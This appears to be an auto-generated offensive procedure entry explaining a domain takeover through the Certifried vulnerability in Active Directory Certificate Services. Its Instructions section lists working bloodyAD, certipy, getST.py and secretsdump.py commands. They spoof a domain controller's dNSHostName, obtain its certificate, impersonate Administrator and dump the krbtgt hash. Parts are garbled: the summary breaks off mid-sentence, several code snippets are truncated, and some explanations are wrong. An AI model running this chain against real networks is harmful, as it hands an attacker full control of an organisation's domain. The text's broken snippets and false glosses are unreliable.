---
id: 0cd3a938-5a0e-4d27-95d7-23209cbb307c
name: Domain Takeover via Certifried CVE-2022-26923
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.143538+00:00'
updated_at: '2023-04-10T20:36:10.252413+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Discovery|TA0007 - Discovery]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Domain Trust Discovery|T1482 - Domain Trust Discovery]]'
- '[[Group Policy Modification|T1484 - Group Policy Modification]]'
- '[[Unsecured Credentials|T1552 - Unsecured Credentials]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Active Directory Certificate Services]]'
- '[[Certifried CVE-2022-26923]]'
commands:
- '[[Get dNSHostName attribute of computer object ''cve'']]'
- '[[Set dNSHostName attribute for computer object ''cve'']]'
---

# Domain Takeover via Certifried CVE-2022-26923

## Summary

Domain takeover via Certifried CVE-2022-26923 is an attack that exploits a vulnerability in Active Directory Certificate Services (ADCS) to obtain a machine certificate for a domain controller. This certificate can then be used to impersonate the domain controller and gain access to the domain. The

## Description

# Description

Domain takeover via Certifried CVE-2022-26923 is an attack that exploits a vulnerability in Active Directory Certificate Services (ADCS) to obtain a machine certificate for a domain controller. This certificate can then be used to impersonate the domain controller and gain access to the domain. The attack requires the attacker to have access to a domain-joined machine and the ability to run arbitrary code on it.

Technical Explanation: The vulnerability in ADCS allows an attacker to request a machine certificate for a domain controller without providing valid credentials. This certificate can then be used to authenticate to other machines in the domain as if the attacker was the domain controller. The attack can be carried out using the Certifried tool, which automates the process of requesting the certificate.

Business Value: Domain takeover via Certifried CVE-2022-26923 can give an attacker complete control over an organization's Active Directory environment, allowing them to steal sensitive data, deploy malware, and carry out other malicious activities.

 

## Requirements

1. Access to a domain-joined machine

1. Ability to run arbitrary code on the machine

1. Certifried tool

 

## Defense

1. Apply the latest patches and updates to Active Directory Certificate Services

1. Implement network segmentation to limit the impact of a compromised machine

1. Monitor for suspicious certificate requests and revocation

 

## Objectives

1. Obtain a machine certificate for a domain controller

1. Impersonate the domain controller

1. Gain access to the domain

 

# Instructions

1. This command is used to find the value of 'ms-DS-MachineAccountQuota' attribute in Active Directory.

 



**Code**: [[python bloodyAD.py -d lab.local -u username -p 'Pa]]



> The command uses the 'bloodyAD.py' script to connect to the Active Directory domain 'lab.local' with the given credentials. The 'getObjectAttributes' command is then used to retrieve the value of the 'ms-DS-MachineAccountQuota' attribute for the domain 'DC=lab,DC=local'. The retrieved value represents the maximum number of machine accounts that can be created in the domain. The value of this attribute can be increased to allow more machine accounts to be created in the domain.

2. To add a new computer to the Active Directory, execute the following command in the PowerShell terminal:

 



**Code**: [[python bloodyAD.py -d lab.local -u username -p 'Pa]]



> This command adds a new computer to the Active Directory with the provided credentials. The command uses the `bloodyAD.py` script to add the computer and the `certipy` tool to create the computer account. The `addComputer` command takes two arguments, the first being the computer name and the second being the password for the computer. The `certipy` command creates a new computer account with the provided credentials. The `-user` flag specifies the username for the account and the `-dns` flag specifies the DNS name of the domain controller. By default, the `MachineAccountQuota` is set to 10, which means that only 10 computer accounts can be created for a single user account. This can be changed by modifying the `MachineAccountQuota` attribute in the Active Directory.

3. To reset the SPN of a machine using Rubeus, follow the below instructions:
1. Run the command `Rubeus.exe tgtdeleg`
2. Export the Kerberos ticket to a cache file using the command `export KRB5CCNAME=/tmp/ws02.ccache`
3. Execute the command `python bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local setAttribute 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName '[]'`
4. The SPN of the machine will be reset.

 



**Code**: [[Rubeus.exe tgtdeleg
export KRB5CCNAME=/tmp/ws02.cc]]



> This command is used to reset the Service Principal Name (SPN) of a machine. The machine account quota should be set to 0 and the user running the command should have SYSTEM privileges. This command uses Rubeus to delegate the ticket and then uses the bloodyAD script to reset the SPN of the machine.

4. To set the `dNSHostName` attribute for a Domain Controller, run the following commands in PowerShell:

 



**Code**: [[python bloodyAD.py -d lab.local -u username -p 'Pa]]



> This command sets the `dNSHostName` attribute for a Domain Controller to match the hostname of the Domain Controller itself. This is useful for ensuring that the DNS records for the Domain Controller are correct and up-to-date. The `bloodyAD.py` script is used to interact with the Active Directory domain, and the `setAttribute` command is used to set the attribute value. The `getObjectAttributes` command is used to verify that the attribute was set correctly.



**Command** ([[Set dNSHostName attribute for computer object 'cve']]):

```bash
python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '["DC.lab.local"]'
```





**Command** ([[Get dNSHostName attribute of computer object 'cve']]):

```bash
python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName
```



5. Use certipy command to request a machine certificate from ADCS

 



**Code**: [[# certipy req 'domain.local/cve$:CVEPassword1234*@]]



> This command is used to request a machine certificate from ADCS (Active Directory Certificate Services) using certipy tool. The command takes arguments such as domain name, password, DC IP, and CA name to request the certificate. The 'template' argument specifies the type of certificate to be requested, in this case 'Machine' certificate. The '-ca' argument specifies the name of the CA from which the certificate is requested. This command can be used to automate the process of requesting machine certificates from ADCS.

6. To use this command, follow the below steps:
1. Authenticate with the domain controller using the following command: certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10
2. Convert the pfx file to pem using the following command: openssl pkcs12 -in dc.pfx -out dc.pem -nodes
3. Set the RBCD on your machine account using the following command: python bloodyAD.py -d lab.local  -c ":dc.pem" -u 'cve$' --host 10.10.10.10 setRbcd 'CVE$' 'CRASHDC$'
4. Get the ST using the following command: getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'
5. Dump the domain secrets using the following command: secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10

 



**Code**: [[certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10

ope]]



> This command is used to take over a domain. The first step is to authenticate with the domain controller using the certipy auth command. Next, the pfx file is converted to pem using the openssl pkcs12 command. Then, the RBCD is set on the machine account using the bloodyAD.py command. The ST is obtained using the getST.py command and the domain secrets are dumped using the secretsdump.py command.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Discovery|TA0007 - Discovery]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Domain Trust Discovery|T1482 - Domain Trust Discovery]]
- [[Group Policy Modification|T1484 - Group Policy Modification]]
- [[Unsecured Credentials|T1552 - Unsecured Credentials]]

## Commands Used

- [[Get dNSHostName attribute of computer object 'cve']]
- [[Set dNSHostName attribute for computer object 'cve']]

## Tags

- [[Active Directory Attacks]]
- [[Active Directory Certificate Services]]
- [[Certifried CVE-2022-26923]]


